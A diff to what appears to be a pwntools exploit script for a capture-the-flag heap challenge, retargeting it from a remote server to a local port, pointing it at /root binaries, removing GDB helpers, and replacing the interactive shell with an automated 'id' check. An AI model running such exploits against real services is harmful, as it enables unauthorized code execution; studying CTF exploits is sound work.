@@ -9,15 +9,7 @@ import time
 import sys
 import signal
 
-salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
 
-def clear(signum=None, stack=None):
-    print('Strip  all debugging information')
-    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
-    exit(0)
-
-for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
-    signal.signal(sig, clear)
 
 # # Create a symbol file for GDB debugging
 # try:
@@ -36,29 +28,15 @@ for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]:
 context.arch = 'amd64'
 # context.arch = 'i386'
 # context.log_level = 'debug'
-execve_file = './vip'
+execve_file = '/root/input_elf'
 # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
 # sh = process(execve_file)
-sh = remote('112.126.103.14', 9999)
+sh = remote('127.0.0.1', 60005)
 elf = ELF(execve_file)
 # libc = ELF('./libc-2.27.so')
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+libc = ELF('/root/libc.so')
 
-# Create temporary files for GDB debugging
-try:
-    gdbscript = '''
-    b *0x401898
-    '''
 
-    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
-    f.write(str(proc.pidof(sh)[0]))
-    f.close()
-
-    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
-    f.write(gdbscript)
-    f.close()
-except Exception as e:
-    print(e)
 
 def alloc(index):
     sh.sendlineafter('choice: ', '1')
@@ -145,5 +123,10 @@ edit(2, 0x200, flat(layout).ljust(0x100, '\0') + 'flag\0')
 sh.sendlineafter('choice: ', '5')
 
 
-sh.interactive()
-clear()
+sleep(1)
+sh.sendline("id")
+sleep(1)
+print sh.recv(timeout=5)
+sleep(10)
+sh.close
+#sh.interactive()
